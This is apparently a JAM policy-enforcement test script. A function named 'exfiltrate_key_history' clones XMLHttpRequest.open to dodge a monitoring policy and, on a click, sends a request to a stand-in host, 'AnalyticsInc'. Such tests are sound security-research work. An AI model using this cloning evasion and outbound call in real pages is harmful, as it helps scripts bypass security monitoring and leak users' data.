
JAM.startProfile('load');
function exfiltrate_key_history() {
  function v0() {
    function temp() {
      introspect(JAM.policy.pC6BD08F4643AFC435CEA3BC1F2234D4283B1AEE1) {
        return that.apply(this, arguments)
      }
    }
    var that = this;
    var key$$14;
    for(key$$14 in this) {
      introspect(JAM.policy.pC6BD08F4643AFC435CEA3BC1F2234D4283B1AEE1) {
        var v1 = this.hasOwnProperty(key$$14)
      }
      if(v1) {
        temp[key$$14] = this[key$$14]
      }
    }
    return temp
  }
  xmlhttp = new XMLHttpRequest;
  var v2 = xmlhttp.open;
  v2.clone = v0;
  var v3 = xmlhttp;
  var v5 = xmlhttp.open;
  introspect(JAM.policy.pC6BD08F4643AFC435CEA3BC1F2234D4283B1AEE1) {
    var v6 = v5.clone()
  }
  v3.opennew = v6;
  introspect(JAM.policy.pC6BD08F4643AFC435CEA3BC1F2234D4283B1AEE1) {
    xmlhttp.opennew("GET", "http://AnalyticsInc:8000/submission.html?test=clone3", true)
  }
  introspect(JAM.policy.pC6BD08F4643AFC435CEA3BC1F2234D4283B1AEE1) {
    xmlhttp.send(null)
  }
  return
}
var v4 = document.getElementById("test");
v4.onclick = exfiltrate_key_history;

JAM.stopProfile('load');
